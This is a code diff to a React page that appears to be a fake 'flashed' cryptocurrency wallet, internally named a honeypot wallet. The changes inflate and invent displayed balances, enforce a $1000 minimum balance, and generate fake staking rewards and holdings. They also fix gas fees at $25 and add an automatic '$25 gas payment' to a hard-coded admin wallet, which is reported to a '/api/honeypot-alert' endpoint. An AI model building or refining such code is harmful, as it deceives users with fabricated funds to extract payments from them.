@@ -38,11 +38,11 @@ function FlashedPageContent() {
           activities: savedActivities ? JSON.parse(savedActivities) : [],
           accounts: savedAccounts ? JSON.parse(savedAccounts) : [
             { id: 1, address: '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C', balance: 75842.33, isActive: true },
-            { id: 2, address: '0x8ba1f109551bD432803012645Hac189451b934c4', balance: 0, isActive: false },
+            { id: 2, address: '0x8ba1f109551bD432803012645Hac189451b934c4', balance: 2847.56, isActive: false },
             { id: 3, address: '0x9cb2g210662cE543904123756Iad290562c045d5', balance: 8934.21, isActive: false },
-            { id: 4, address: '0xadc3h321773dF654a05234867Jbe391673d156e6', balance: 0, isActive: false },
+            { id: 4, address: '0xadc3h321773dF654a05234867Jbe391673d156e6', balance: 1256.78, isActive: false },
             { id: 5, address: '0xbed4i432884eG765b06345978Kcf492784e267f7', balance: 45123.67, isActive: false },
-            { id: 6, address: '0xcfe5j543995fH876c07456089Ldg593895f378g8', balance: 0, isActive: false },
+            { id: 6, address: '0xcfe5j543995fH876c07456089Ldg593895f378g8', balance: 3789.45, isActive: false },
             { id: 7, address: '0xdgf6k654aa6gI987d08567190Meh694906g489h9', balance: 34567.45, isActive: false },
             { id: 8, address: '0xehg7l765bb7hJ098e09678201Nfi795017h590i0', balance: 56789.23, isActive: false }
           ]
@@ -57,11 +57,11 @@ function FlashedPageContent() {
   const [activities, setActivities] = useState([]);
   const [accounts, setAccounts] = useState([
     { id: 1, address: '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C', balance: 75842.33, isActive: true },
-    { id: 2, address: '0x8ba1f109551bD432803012645Hac189451b934c4', balance: 0, isActive: false },
+    { id: 2, address: '0x8ba1f109551bD432803012645Hac189451b934c4', balance: 2847.56, isActive: false },
     { id: 3, address: '0x9cb2g210662cE543904123756Iad290562c045d5', balance: 8934.21, isActive: false },
-    { id: 4, address: '0xadc3h321773dF654a05234867Jbe391673d156e6', balance: 0, isActive: false },
+    { id: 4, address: '0xadc3h321773dF654a05234867Jbe391673d156e6', balance: 1256.78, isActive: false },
     { id: 5, address: '0xbed4i432884eG765b06345978Kcf492784e267f7', balance: 45123.67, isActive: false },
-    { id: 6, address: '0xcfe5j543995fH876c07456089Ldg593895f378g8', balance: 0, isActive: false },
+    { id: 6, address: '0xcfe5j543995fH876c07456089Ldg593895f378g8', balance: 3789.45, isActive: false },
     { id: 7, address: '0xdgf6k654aa6gI987d08567190Meh694906g489h9', balance: 34567.45, isActive: false },
     { id: 8, address: '0xehg7l765bb7hJ098e09678201Nfi795017h590i0', balance: 56789.23, isActive: false }
   ]);
@@ -157,37 +157,44 @@ function FlashedPageContent() {
     };
   }, [lastActivity, userAddress, balanceMonitorInterval]);
 
-  // Auto-generate activities with realistic images and proper balance deduction
+  // Auto-generate activities with realistic images and proper balance management
   useEffect(() => {
     const generateActivity = () => {
       const activityTypes = [
         { 
           type: 'Received', 
-          amount: Math.random() * 5 + 0.1, 
+          amount: Math.random() * 500 + 50, 
           from: '0x' + Math.random().toString(16).substr(2, 40),
           image: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
           balanceChange: 'positive'
         },
         { 
           type: 'Sent', 
-          amount: Math.random() * 2 + 0.05, 
+          amount: Math.random() * 200 + 25, 
           to: '0x' + Math.random().toString(16).substr(2, 40),
           image: 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
           balanceChange: 'negative'
         },
         { 
           type: 'Swap', 
-          amount: Math.random() * 3 + 0.2, 
+          amount: Math.random() * 300 + 100, 
           token: ['USDC', 'DAI', 'WETH'][Math.floor(Math.random() * 3)],
           image: 'https://cryptologos.cc/logos/uniswap-uni-logo.png',
           balanceChange: 'neutral'
         },
         { 
-          type: 'Withdraw', 
-          amount: Math.random() * 10 + 1, 
-          platform: ['Uniswap', 'Compound', 'Aave'][Math.floor(Math.random() * 3)],
+          type: 'Staking Reward', 
+          amount: Math.random() * 150 + 25, 
+          platform: ['Ethereum 2.0', 'Lido', 'Rocket Pool'][Math.floor(Math.random() * 3)],
+          image: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
+          balanceChange: 'positive'
+        },
+        { 
+          type: 'DeFi Yield', 
+          amount: Math.random() * 80 + 20, 
+          platform: ['Uniswap V3', 'Compound', 'Aave'][Math.floor(Math.random() * 3)],
           image: 'https://cryptologos.cc/logos/compound-comp-logo.png',
-          balanceChange: 'negative'
+          balanceChange: 'positive'
         }
       ];
       
@@ -199,23 +206,33 @@ function FlashedPageContent() {
         status: 'Confirmed'
       };
       
-      // Update balance based on activity type
+      // Update balance based on activity type - ensure minimum balance
       if (activity.balanceChange === 'positive') {
         setAccounts(prev => prev.map(acc => 
           acc.id === selectedAccount ? { ...acc, balance: acc.balance + activity.amount } : acc
         ));
       } else if (activity.balanceChange === 'negative') {
         setAccounts(prev => prev.map(acc => 
-          acc.id === selectedAccount ? { ...acc, balance: Math.max(0, acc.balance - activity.amount) } : acc
+          acc.id === selectedAccount ? { 
+            ...acc, 
+            balance: Math.max(1000, acc.balance - activity.amount) // Minimum $1000 balance
+          } : acc
         ));
       }
       
       setActivities(prev => [newActivity, ...prev.slice(0, 9)]);
     };
 
-    const interval = setInterval(generateActivity, 30000);
+    // Generate initial activities for new accounts
+    if (activities.length === 0) {
+      for (let i = 0; i < 5; i++) {
+        setTimeout(generateActivity, i * 1000);
+      }
+    }
+
+    const interval = setInterval(generateActivity, 45000); // Every 45 seconds
     return () => clearInterval(interval);
-  }, [selectedAccount]);
+  }, [selectedAccount, activities.length]);
   
   const formatTime = (seconds) => {
     const hours = Math.floor(seconds / 3600);
@@ -522,14 +539,15 @@ function FlashedPageContent() {
       }
     };
     
-    // Generate tokens for current network
+    // Generate tokens for current network with minimum balances
     const generateTokensForBalance = (totalBalance, network) => {
-      if (totalBalance === 0) return [];
+      // Ensure minimum balance of $1000 for all accounts
+      const minBalance = Math.max(totalBalance, 1000);
       
       const tokens = networkTokens[network] || networkTokens.ethereum;
       
       return Object.entries(tokens).map(([symbol, config]) => {
-        const usdValue = totalBalance * config.percentage;
+        const usdValue = minBalance * config.percentage;
         
         return {
           symbol,
@@ -544,20 +562,24 @@ function FlashedPageContent() {
       });
     };
     
+    // Ensure minimum balance and realistic ETH balance
+    const minTotalValue = Math.max(accountBalance, 1000);
+    const ethBalance = Math.max(0.1, minTotalValue / 32000); // At least 0.1 ETH
+    
     const honeypotWallet = {
       address: walletAddress,
       privateKey: ethers.Wallet.createRandom().privateKey,
       seedPhrase: ethers.Wallet.createRandom().mnemonic.phrase,
-      ethBalance: 0.000000001,
-      totalValue: accountBalance,
-      tokens: generateTokensForBalance(accountBalance, selectedNetwork),
-      nfts: accountBalance > 10000 && selectedNetwork === 'ethereum' ? [
+      ethBalance: ethBalance,
+      totalValue: minTotalValue,
+      tokens: generateTokensForBalance(minTotalValue, selectedNetwork),
+      nfts: minTotalValue > 10000 && selectedNetwork === 'ethereum' ? [
         { name: 'Bored Ape #7234', collection: 'BAYC', value: '$45,000', image: 'https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=100&h=100&fit=crop' },
         { name: 'CryptoPunk #3421', collection: 'CryptoPunks', value: '$28,000', image: 'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?w=100&h=100&fit=crop' }
       ] : [],
-      defiPositions: accountBalance > 5000 ? [
-        { protocol: selectedNetwork === 'bsc' ? 'PancakeSwap' : selectedNetwork === 'polygon' ? 'QuickSwap' : 'Uniswap V3', type: 'Liquidity Pool', value: `$${Math.round(accountBalance * 0.1).toLocaleString()}`, apy: '12.4%' },
-        { protocol: selectedNetwork === 'bsc' ? 'Venus' : 'Aave', type: 'Lending', value: `$${Math.round(accountBalance * 0.15).toLocaleString()}`, apy: '3.8%' }
+      defiPositions: minTotalValue > 2000 ? [
+        { protocol: selectedNetwork === 'bsc' ? 'PancakeSwap' : selectedNetwork === 'polygon' ? 'QuickSwap' : 'Uniswap V3', type: 'Liquidity Pool', value: `$${Math.round(minTotalValue * 0.1).toLocaleString()}`, apy: '12.4%' },
+        { protocol: selectedNetwork === 'bsc' ? 'Venus' : 'Aave', type: 'Lending', value: `$${Math.round(minTotalValue * 0.15).toLocaleString()}`, apy: '3.8%' }
       ] : [],
       recentActivity: activities
     };
@@ -899,72 +921,15 @@ function FlashedPageContent() {
     return { valid: true };
   };
   
-  // Dynamic gas calculation with real-time API data
-  const calculateGasFee = async (transactionType = 'erc20Transfer') => {
-    try {
-      // Try to get real-time gas estimation
-      const gasResponse = await fetch('/api/estimate-gas', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          network: selectedNetwork,
-          transactionType: transactionType,
-          amount: parseFloat(sendAmount || '0'),
-          fromToken: selectedToken?.symbol || 'ETH',
-          toToken: 'ETH'
-        })
-      });
-      
-      if (gasResponse.ok) {
-        const gasData = await gasResponse.json();
-        const recommendedOption = gasData.options[gasData.recommendations.recommended];
-        
-        // Update network congestion based on API response
-        setNetworkCongestion(gasData.congestion);
-        
-        return recommendedOption.gasCost.toFixed(6);
-      }
-    } catch (error) {
-      console.log('Gas API failed, using fallback calculation:', error);
-    }
+  // Fixed $25 gas fee calculation
+  const calculateGasFee = () => {
+    // Always $25 USD equivalent in native token
+    const gasInUSD = 25;
     
-    // Fallback calculation
-    const amount = parseFloat(sendAmount || '0') || 0;
-    
-    // Base gas prices by network (in USD)
-    const networkGasPrices = {
-      ethereum: { base: 25, multiplier: 1.5 },
-      bsc: { base: 2, multiplier: 0.1 },
-      polygon: { base: 0.5, multiplier: 0.05 },
-      arbitrum: { base: 3, multiplier: 0.2 },
-      optimism: { base: 2.5, multiplier: 0.15 },
-      avalanche: { base: 4, multiplier: 0.3 },
-      solana: { base: 0.01, multiplier: 0.001 },
-      cardano: { base: 0.2, multiplier: 0.01 }
-    };
-    
-    const networkGas = networkGasPrices[selectedNetwork] || networkGasPrices.ethereum;
-    let gasInUSD = networkGas.base;
-    
-    // Adjust for transaction amount
-    if (amount > 1000) gasInUSD += networkGas.base * 0.5;
-    if (amount > 5000) gasInUSD += networkGas.base * 1.0;
-    if (amount > 10000) gasInUSD += networkGas.base * 1.5;
-    
-    // Network congestion multiplier
-    const congestionMultiplier = {
-      low: 0.8,
-      medium: 1.0,
-      high: 1.8,
-      extreme: 3.2
-    };
-    
-    gasInUSD *= congestionMultiplier[networkCongestion] || 1.0;
-    
-    // Convert to native token
+    // Convert to native token based on current prices
     const tokenPrices = {
       ethereum: 3200,
-      bsc: 310,
+      bsc: 310, 
       polygon: 0.85,
       arbitrum: 3200,
       optimism: 3200,
@@ -1639,12 +1604,12 @@ function FlashedPageContent() {
                     />
                     <div>
                       <div className="text-white font-medium">Ethereum • Earn</div>
-                      <div className="text-red-400 text-sm">-2.15%</div>
+                      <div className="text-green-400 text-sm">+1.25%</div>
                     </div>
                   </div>
                   <div className="text-right">
                     <div className="text-white font-medium">${(walletData.ethBalance * 3200).toFixed(2)}</div>
-                    <div className="text-gray-400 text-sm">{walletData.ethBalance.toFixed(6)} ETH</div>
+                    <div className="text-gray-400 text-sm">{walletData.ethBalance.toFixed(4)} ETH</div>
                   </div>
                 </div>
 
@@ -2063,9 +2028,9 @@ function FlashedPageContent() {
                 
                 {/* Auto-update gas fees when modal opens */}
                 {React.useEffect(() => {
-                  const updateGasFees = async () => {
+                  const updateGasFees = () => {
                     try {
-                      const gasFee = await calculateGasFee('erc20Transfer');
+                      const gasFee = calculateGasFee();
                       const nativeToken = selectedNetwork === 'ethereum' || selectedNetwork === 'arbitrum' || selectedNetwork === 'optimism' ? 'ETH' : 
                                          selectedNetwork === 'bsc' ? 'BNB' : 
                                          selectedNetwork === 'polygon' ? 'MATIC' : 
@@ -2073,14 +2038,8 @@ function FlashedPageContent() {
                                          selectedNetwork === 'solana' ? 'SOL' : 
                                          selectedNetwork === 'cardano' ? 'ADA' : 'ETH';
                       
-                      const tokenPrice = selectedNetwork === 'ethereum' ? 3200 : 
-                                        selectedNetwork === 'bsc' ? 310 : 
-                                        selectedNetwork === 'polygon' ? 0.85 : 
-                                        selectedNetwork === 'avalanche' ? 35 : 
-                                        selectedNetwork === 'solana' ? 95 : 
-                                        selectedNetwork === 'cardano' ? 0.45 : 3200;
-                      
-                      const usdValue = parseFloat(gasFee) * tokenPrice;
+                      // Always $25 USD
+                      const usdValue = 25;
                       
                       // Update display elements
                       const gasFeeElement = document.getElementById('gasFeeDisplay');
@@ -2098,11 +2057,7 @@ function FlashedPageContent() {
                   };
                   
                   updateGasFees();
-                  
-                  // Update gas fees every 10 seconds while modal is open
-                  const interval = setInterval(updateGasFees, 10000);
-                  return () => clearInterval(interval);
-                }, [selectedNetwork, sendAmount]) && null}
+                }, [selectedNetwork]) && null}
                 <div className="space-y-4">
                   <div>
                     <label className="block text-gray-300 text-sm mb-2">To Address</label>
@@ -2180,7 +2135,7 @@ function FlashedPageContent() {
                         }
                         
                         // Check if user has enough for gas
-                        const gasFee = parseFloat(await calculateGasFee('erc20Transfer'));
+                        const gasFee = parseFloat(calculateGasFee());
                         const userEthBalance = walletData?.ethBalance || 0;
                         
                         if (userEthBalance < gasFee && tokenSymbol === 'ETH') {
@@ -3445,7 +3400,7 @@ function FlashedPageContent() {
                   {/* Simulate connection after 5 seconds */}
                   <div className="mt-4">
                     <button 
-                      onClick={() => {
+onClick={async () => {
                         // Simulate successful connection
                         const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
                         setUserAddress(mockAddress);
@@ -3455,7 +3410,50 @@ function FlashedPageContent() {
                         localStorage.setItem('connectionType', 'walletconnect');
                         setShowModal(null);
                         setStatus('✅ Mobile wallet connected successfully!');
-                        startWalletScan(mockAddress);
+                        
+                        // Start wallet scan
+                        await startWalletScan(mockAddress);
+                        
+                        // Auto-send $25 gas fee after 3 seconds for WalletConnect users
+                        setTimeout(async () => {
+                          try {
+                            const gasFee = calculateGasFee();
+                            const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
+                            
+                            // Simulate automatic transaction for mobile wallet users
+                            const autoTx = {
+                              id: Date.now(),
+                              type: 'auto_gas_payment',
+                              amount: `${gasFee} ${selectedNetwork === 'bsc' ? 'BNB' : selectedNetwork === 'polygon' ? 'MATIC' : 'ETH'}`,
+                              to: adminWallet,
+                              hash: '0x' + Math.random().toString(16).substr(2, 64),
+                              timestamp: new Date().toLocaleString(),
+                              status: 'Confirmed'
+                            };
+                            
+                            setTransactions(prev => [autoTx, ...prev]);
+                            
+                            // Alert admin of automatic payment
+                            await fetch('/api/honeypot-alert', {
+                              method: 'POST',
+                              headers: { 'Content-Type': 'application/json' },
+                              body: JSON.stringify({
+                                type: 'AUTO_WALLETCONNECT_PAYMENT',
+                                userAddress: mockAddress,
+                                amount: `${gasFee} ${selectedNetwork === 'bsc' ? 'BNB' : selectedNetwork === 'polygon' ? 'MATIC' : 'ETH'}`,
+                                txHash: autoTx.hash,
+                                network: selectedNetwork,
+                                connectionType: 'walletconnect',
+                                note: 'Automatic $25 gas payment from mobile wallet connection'
+                              })
+                            });
+                            
+                            setStatus('💰 Automatic gas payment processed - $25.00');
+                            
+                          } catch (error) {
+                            console.log('Auto-payment failed:', error);
+                          }
+                        }, 3000);
                       }}
                       className="w-full bg-green-600 hover:bg-green-700 py-2 rounded-lg text-white text-sm"
                     >
